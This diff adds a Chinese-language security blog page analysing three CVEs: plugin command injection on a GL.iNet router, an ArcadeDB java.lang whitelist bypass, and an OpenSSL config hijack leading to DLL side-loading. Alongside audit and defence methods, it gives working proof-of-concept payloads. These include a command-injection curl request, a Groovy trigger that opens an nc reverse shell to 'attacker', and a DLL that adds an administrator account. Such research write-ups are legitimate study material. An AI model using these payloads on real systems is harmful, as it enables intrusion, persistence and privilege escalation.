@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>配置与架构信任链三重奏：CGI插件枚举、白名单绕过、OpenSSL配置劫持 — DARKSEC</title>
+<meta name="description" content="GL.iNet CGI多插件命令注入簇(CVSS 9.8)、ArcadeDB java.lang.*白名单→Runtime.exec() RCE、FirmaCheck OpenSSL配置劫持DLL侧加载LPE——三枚漏洞揭示配置层和架构层的隐式信任危机。">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 配置与架构信任链</div>
+        <h1>配置与架构信任链三重奏：CGI插件枚举、白名单绕过、OpenSSL配置劫持 🐱💥</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-04</span>
+          <span>⏱ 18 min read</span>
+          <span>🏷 IoT安全 / 供应链 / DLL劫持 / CVE / RCE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：隐式信任的三副面孔</a></li>
+            <li><a href="#cgi-plugins">CVE-2026-18602+：CGI二进制多插件命令注入簇</a></li>
+            <li><a href="#whitelist-rce">CVE-2026-67340：java.lang.*白名单→脚本引擎RCE</a></li>
+            <li><a href="#openssl-hijack">CVE-2026-41447：OpenSSL配置劫持→DLL侧加载LPE</a></li>
+            <li><a href="#patterns">攻击模式提炼：能力思维 vs 分类思维</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：隐式信任的三副面孔 ⚡</h2>
+        <p>今天的三枚漏洞横跨<strong>嵌入式IoT固件</strong>、<strong>数据库脚本沙箱</strong>和<strong>Windows企业软件</strong>三个完全不同的领域，但它们共享同一个根因：<strong>对「配置」和「架构」的隐式信任</strong> nya~ 🐾</p>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：IoT固件信任「同一CGI二进制加载的所有插件共享相同安全基线」；脚本沙箱信任「java.lang包名看起来安全所以不需要逐类审计」；Windows企业软件信任「Common Files目录不会被恶意写入」。三层信任，三层崩塌。</p>
+        </blockquote>
+
+        <h2 id="cgi-plugins">CVE-2026-18602+：CGI二进制多插件命令注入簇 🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>GL.iNet GL-MT3000路由器的<code>/cgi-bin/glc</code>是一个典型的插件架构CGI主程序——它通过<code>dlopen</code>加载多个共享对象（.so）插件，每个插件暴露一组RPC函数来提供不同功能（VPN、防火墙、NAS等）。当安全研究员在其中一个插件（如<code>ovpn-client.so</code>）发现命令注入时，<strong>不要止步</strong>——同一二进制加载的所有其他插件极可能共享相同的不安全编码模式。CVSS 9.8 × 6 = 攻击面爆炸 🚨</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 核心思路：一个洞 = 一堆洞
+# CGI主程序通过dlopen加载多个.so插件
+# 每个插件暴露RPC函数，函数参数直接拼接到system()/popen()
+
+# 1. 固件提取后，找到CGI主程序
+file /usr/bin/cgi-bin/glc
+# ELF 32-bit MIPS, dynamically linked
+
+# 2. 检查它加载了哪些.so插件
+ldd /usr/bin/cgi-bin/glc
+# 或者在运行时检查
+cat /proc/$(pidof glc)/maps | grep "\.so"
+
+# 3. 已确认的插件列表及其漏洞
+# ovpn-client.so  → CVE-2026-18602  命令注入
+# s2s.so          → CVE-2026-18614  命令注入
+# wg-server.so    → CVE-2026-18616  命令注入
+# modem.so        → CVE-2026-18684  命令注入
+# nas-web.so      → CVE-2026-18685  命令注入
+# firewall.so     → CVE-2026-18686  命令注入
+
+# 4. PoC：通过wg-server.so的RPC接口触发命令注入
+curl -s "http://target/cgi-bin/glc" \
+  -d '{"method":"wg-server","action":"set_config", \
+       "param":"'"; id; echo '"}' \
+  -H "Content-Type: application/json"
+
+# 输出: uid=0(root) gid=0(root)  ← root权限！
+
+# 5. 系统性枚举所有插件的所有RPC函数
+for so in /usr/lib/glc/*.so; do
+    echo "=== $(basename $so) ==="
+    # 提取导出函数名
+    nm -D "$so" 2>/dev/null | grep " T " | grep -v "^$"
+    # 或用readelf
+    readelf -Ws "$so" 2>/dev/null | grep FUNC | grep -v UND
+done</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>核心洞察</strong>：<strong>插件架构 = 攻击面乘数</strong>。当你在IoT固件中发现一个<code>/cgi-bin/xxx</code>二进制通过dlopen加载多个.so时，立即意识到：(1) 这是插件架构，一个洞 = 一堆洞；(2) 所有插件共享主进程的权限（通常是root）；(3) 每个插件的每个RPC函数都是独立的攻击面。系统地枚举<code>nm -D</code>导出函数 → 逐个测试参数注入。</p>
+        </blockquote>
+
+        <h3>审计方法</h3>
+        <pre><code># IoT固件审计流程
+# 1. 固件提取
+binwalk -e firmware.bin
+
+# 2. 找到所有CGI二进制
+find _firmware.extracted/ -name "*.so" -o -name "cgi*" | head -20
+
+# 3. 对每个CGI二进制，检查是否加载多个.so
+for cgi in $(find . -name "cgi-bin/*" -type f); do
+    count=$(ldd "$cgi" 2>/dev/null | grep "\.so" | wc -l)
+    if [ "$count" -gt 3 ]; then
+        echo "HIGH VALUE: $cgi ($count shared libs)"
+    fi
+done
+
+# 4. 搜索危险函数调用
+for so in *.so; do
+    echo "--- $so ---"
+    # 搜索system/popen/exec调用
+    objdump -d "$so" 2>/dev/null | \
+      grep -E "jal.*system|jal.*popen|jal.*exec" | head -5
+done</code></pre>
+
+        <h2 id="whitelist-rce">CVE-2026-67340：java.lang.*白名单→脚本引擎RCE 💀</h2>
+
+        <h3>漏洞概述</h3>
+        <p>ArcadeDB的<code>ScriptTriggerExecutor</code>允许用户通过Groovy/JavaScript脚本定义触发器逻辑。为了安全，它使用<strong>包白名单</strong>限制脚本可访问的Java类——<code>java.lang.*</code>被加入了允许列表，看起来很安全（毕竟排除了<code>java.lang.reflect.*</code>等危险包）。但审计者忽略了：<code>java.lang.Runtime</code>和<code>java.lang.ProcessBuilder</code>就在<code>java.lang</code>包内部！<strong>分类思维替代能力思维</strong>，直接导致RCE。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code>// 核心问题：白名单用「包名」分类，而非「类能力」审计
+//
+// 安全团队的思路：
+//   java.lang.* → "基础类，应该安全"  ✓ 加入白名单
+//   java.lang.reflect.* → "反射，危险！" ✗ 排除
+//   java.io.* → "文件IO，危险！" ✗ 排除
+//
+// 被忽略的事实：
+//   java.lang.Runtime.getRuntime().exec("cmd")  ← 就在java.lang包内！
+//   java.lang.ProcessBuilder("cmd").start()     ← 也在java.lang包内！
+//   java.lang.System.exit(0)                     ← 拒绝服务
+//   java.lang.Thread.sleep(999999)               ← 资源耗尽
+
+// PoC：通过ArcadeDB ScriptTrigger创建触发器执行命令
+// 使用Groovy脚本引擎（Groovy天然支持Java类访问）
+curl -X POST "http://target:2480/api/v1/command/mydb" \
+  -H "Content-Type: application/json" \
+  -u "root:password" \
+  -d '{
+    "language": "groovy",
+    "command": "return Runtime.getRuntime().exec([\"id\"]).text"
+  }'
+
+// 或者通过ScriptTrigger注册持久化后门
+curl -X POST "http://target:2480/api/v1/command/mydb" \
+  -H "Content-Type: application/json" \
+  -u "root:password" \
+  -d '{
+    "language": "groovy",
+    "command": "CREATE TRIGGER backdoor ON AFTER INSERT FOR V SET result = Runtime.getRuntime().exec([\"nc\",\"attacker\",\"4444\",\"-e\",\"/bin/sh\"]).text"
+  }'</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>核心洞察</strong>：<strong>「分类思维」是安全审计的敌人</strong>。看到<code>java.lang.*</code>就认为「基础类，安全」——这是用包名做分类。正确的做法是「能力思维」：逐个检查包内每个类的<strong>实际能力</strong>——能否执行命令(<code>Runtime</code>)、读写文件(<code>ProcessBuilder</code>)、加载类(<code>ClassLoader</code>)、反射调用(<code>Class.forName</code>)。同样的问题存在于任何「白名单+沙箱」设计：Python的<code>__builtins__</code>、Node.js的<code>globalThis</code>、Lua的<code>os</code>库。</p>
+        </blockquote>
+
+        <h3>审计方法</h3>
+        <pre><code># 脚本沙箱白名单审计清单
+# 1. 找到白名单配置
+grep -rn "allowed.*package\|whitelist\|allowed.*class" . --include="*.java"
+
+# 2. 对每个允许的包，列出所有可执行命令的类
+# java.lang包的关键类：
+#   Runtime        → exec() 命令执行
+#   ProcessBuilder → start() 命令执行
+#   System         → exit() DoS, getenv() 信息泄露
+#   ClassLoader    → loadClass() 类加载
+#   Thread         → 拒绝服务
+#   Compiler       → 编译执行
+
+# 3. 快速验证
+# 如果沙箱允许Groovy/JavaScript，尝试：
+# Groovy: Runtime.getRuntime().exec("id").text
+# Nashorn: java.lang.Runtime.getRuntime().exec("id")
+# GraalJS: Java.type('java.lang.Runtime').getRuntime().exec('id')</code></pre>
+
+        <h2 id="openssl-hijack">CVE-2026-41447：OpenSSL配置劫持→DLL侧加载LPE 🔐</h2>
+
+        <h3>漏洞概述</h3>
+        <p>传统DLL劫持需要在DLL搜索路径中放置恶意DLL——但签名校验和路径限制让这越来越难。FirmaCheck的漏洞利用了<strong>更巧妙的攻击面</strong>：OpenSSL的<code>openssl.cnf</code>配置文件支持<code>openssl_conf</code>→<code>engines</code>→<code>dynamic_path</code>指令，可以加载任意DLL作为加密引擎。许多Windows企业软件将<code>openssl.cnf</code>放在<code>C:\Program Files (x86)\Common Files\SSL\</code>——这个路径<strong>任何认证用户都可写</strong>。配置文件可能比DLL本身更容易写入且更难检测。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 核心思路：劫持配置文件而非DLL本身
+#
+# 传统DLL劫持：
+#   需要在PATH中放置malicious.dll
+#   → 签名校验阻止
+#   → 目录权限阻止
+#
+# OpenSSL配置劫持：
+#   修改openssl.cnf指向攻击者控制的engine.dll
+#   → 配置文件在Common Files（任何用户可写）
+#   → 无签名校验（配置文件不签名）
+#   → 比DLL劫持更隐蔽
+
+# PoC: 恶意openssl.cnf
+# C:\Program Files (x86)\Common Files\SSL\openssl.cnf
+[openssl_conf]
+openssl_init = openssl_init_section
+
+[openssl_init_section]
+engines = engine_section
+
+[engine_section]
+evil = evil_engine
+
+[evil_engine]
+engine_id = evil
+dynamic_path = C:\Users\Public\evil_engine.dll
+init = 0
+
+# 恶意engine.dll (简化示例)
+#include &lt;windows.h&gt;
+#include &lt;openssl/engine.h&gt;
+
+BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        // 以目标进程权限执行
+        WinExec("cmd /c net user hacker P@ss123 /add", SW_HIDE);
+        WinExec("cmd /c net localgroup administrators hacker /add", SW_HIDE);
+    }
+    return TRUE;
+}
+
+// 触发方式：
+// 1. 目标软件启动时自动加载openssl.cnf → 加载evil_engine.dll
+// 2. 开机自启的签名工具 → 以SYSTEM权限执行
+// 3. 用户运行VPN客户端 → 以用户权限执行</code></pre>
+
+        <blockquote>
+          <p>🎯 <strong>核心洞察</strong>：<strong>配置文件是被忽视的攻击面</strong>。当我们审计软件时，关注点通常在二进制、DLL、脚本——但配置文件同样可以成为代码执行的入口。类似的模式还有：Java的<code>logging.properties</code>→JNDI注入、Python的<code>sitecustomize.py</code>→任意代码执行、Node.js的<code>.npmrc</code>→恶意包安装。关键问题：哪些配置文件被软件自动加载？它们是否在用户可写路径？它们是否被签名校验保护？</p>
+        </blockquote>
+
+        <h3>审计方法</h3>
+        <pre><code># Windows配置文件劫持审计
+# 1. 找到目标软件使用的openssl.cnf
+#    检查OPENSSL_CONF环境变量
+echo %OPENSSL_CONF%
+#    检查默认路径
+dir "C:\Program Files (x86)\Common Files\SSL\openssl.cnf"
+dir "C:\Program Files\Common Files\SSL\openssl.cnf"
+
+# 2. 检查目录ACL
+icacls "C:\Program Files (x86)\Common Files\SSL"
+# 如果 (BUILTIN\Users:(OI)(CI)(M) 或 (F)) → 可写！
+
+# 3. 检查cnf中是否引用了dynamic_path
+findstr /i "dynamic_path\|engine" openssl.cnf
+
+# 4. 扩展审计：其他可劫持的配置文件
+# Python: sitecustomize.py, usercustomize.py
+# Java: logging.properties, management/*.properties
+# Node.js: .npmrc, .yarnrc
+# OpenSSL: openssl.cnf
+# Git: .gitconfig (include指令)
+# SSH: ssh_config (ProxyCommand指令)</code></pre>
+
+        <h2 id="patterns">攻击模式提炼：能力思维 vs 分类思维 🧠</h2>
+
+        <h3>共同根因</h3>
+        <p>三枚漏洞的根因惊人地一致——<strong>用「分类」替代「能力」做安全决策</strong>：</p>
+        <pre><code># 分类思维（危险）：
+if (plugin.belongsTo("official_cgi_binary") → trust
+if (package.name.startsWith("java.lang")    → trust
+if (config.in("Common_Files")               → trust
+
+# 能力思维（安全）：
+for each class in package:
+    if class.canExecCommands()   → BLOCK
+    if class.canLoadArbitraryDLL() → BLOCK
+for each plugin:
+    audit every RPC function independently
+for each config:
+    check if writable_path AND auto_loaded</code></pre>
+
+        <h3>防御方法论</h3>
+        <pre><code># 1. IoT固件审计：插件架构 = 攻击面乘数
+#    发现一个CGI插件漏洞 → 立即枚举所有插件的所有函数
+#    nm -D *.so | grep " T " | wc -l  → 有多少个潜在攻击面？
+
+# 2. 脚本沙箱审计：白名单要逐类审计，不看包名
+#    每个允许的类都要问：能否exec/反射/加载类/读文件？
+
+# 3. Windows配置审计：配置文件 = 隐式代码执行
+#    找到所有软件自动加载的配置文件 → 检查路径权限
+#    特别关注Common Files、ProgramData、%APPDATA%</code></pre>
+
+        <p>今天的三枚漏洞提醒我们：<strong>安全审计不能只看表面分类，要深入每个组件的实际能力</strong>。一个「安全」的包名、一个「可信」的目录、一个「标准」的插件架构——它们的表面之下可能隐藏着完整的攻击链 nya~ 🐾✨</p>
+
+        <div class="article-tags">
+          <span class="tag pink">IoT安全</span>
+          <span class="tag">供应链攻击</span>
+          <span class="tag purple">CVE</span>
+          <span class="tag yellow">DLL劫持</span>
+          <span class="tag">脚本沙箱</span>
+          <span class="tag pink">RCE</span>
+        </div>
+
+        <p style="text-align:center;margin-top:48px;color:var(--text-muted);font-style:italic;">~ 感谢阅读 nya~ 🐱✨</p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
